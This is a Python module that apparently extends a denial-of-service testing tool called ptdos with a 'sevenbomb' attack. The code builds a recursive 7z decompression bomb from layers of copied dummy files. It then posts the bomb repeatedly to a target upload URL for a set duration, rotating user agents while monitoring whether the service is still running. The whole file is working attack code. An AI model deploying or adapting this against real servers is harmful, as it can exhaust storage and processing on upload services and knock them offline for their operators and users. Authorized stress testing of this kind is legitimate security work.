"""ptdos extension that adds a 7zbomb attack"""
#python3 ptdos.py -a sevenbomb -ds 1 -l 5 -c 5 -dst http://192.168.0.80/upload.php -o mini.7z

# own libs
from infrastructure import factory
from misc.pt_7z import make_recurssive_bomb
from monitoring.ptcheckservice import print_error, attack_append_out_data, attack_checkservice_review
from misc.pt_http import post_file_upload
from misc.globalfuncs import load_user_agents, parse_url
# external libs
from dataclasses import dataclass
from ptlibs.ptprinthelper import ptprint,out_ifnot
from time import time, asctime, sleep
from random import randbytes


@dataclass
class SevenBomb:

    category: str
    name: str

    def launch_attack(self, args, dst, duration, use_json, json_obj, json_no, monitoring, att_start_t_epoch, att_start_t_asc) -> None:
        """Main function responsible for launching the attack."""

        layers = args["layers"]
        copies = args["copies"]
        d_size = args["dummy-size"]
        output = args["output"]

        ptprint(out_ifnot(f"Begining construction, expected size:{d_size*(copies**layers)} MB", "INFO", use_json))

        bomb = make_recurssive_bomb(d_size,copies,layers)

        if(output != ""):
            with open(output,"wb") as sevenzip:
                sevenzip.write(bomb)
                ptprint(out_ifnot(f"Saved payload locally to {output}", "INFO", use_json))
        
        if "127.0.0.1" in dst or "localhost" in dst:
            ptprint(out_ifnot("Local mode detected. Skipping HTTP delivery.", "INFO", use_json))
            return

        my_user_agents, my_accept_lang = load_user_agents()

        att_start_t_epoch = time()
        
        monitoringprocess = monitoring.call_checkservice_repeatedly(use_json)
        ctx = 0
        try:
            while True:
                if time() - att_start_t_epoch >= duration:
                    monitoringprocess()
                    sleep(1)
                    att_end_t_asc = asctime()
                    attack_checkservice_review(monitoring, use_json, json_obj, json_no, self.name)
                    break
                
                if post_file_upload(dst, str(randbytes(8).hex()) + ".7z", bomb, my_user_agents, my_accept_lang):
                    ctx += 1

        except BaseException as err:
            monitoringprocess()
            return print_error(json_obj, use_json, json_no, self.name, str(err))

        attack_append_out_data(use_json, json_obj, json_no, self.name, duration, att_start_t_asc, att_end_t_asc, dst, ctx)
        monitoring.checkservice_append_out_data(json_obj, use_json, json_no)

        return

    @staticmethod
    def make_help():
        """Help for attack printed out in main file ptdos.py."""
        return [
            {"7zBomb attack options": [
                ["-a", "--attack", "<attack>", "Attack name - sevenbomb"],
                ["-ds", "--dummy-size", "<dummy-size>", "Size of the first generated file dummy file in MB"],
                ["-l", "--layers", "<layers>", "Ammount of layers in the 7zbomb"],
                ["-c", "--copies", "<copies>", "Ammount of archives in one layer"],
                ["-dst", "--destination", "<dst>", "Specify destination URL."],
                ["-o", "--output", "<output>", "Specify output for saving 7zbomb locally"]
            ]
            }
        ]

    @staticmethod
    def make_args(parser):
        """Specify arguments needed for the attack"""

def register() -> None:
    """Register attack in factory."""
    factory.register("sevenbomb", SevenBomb)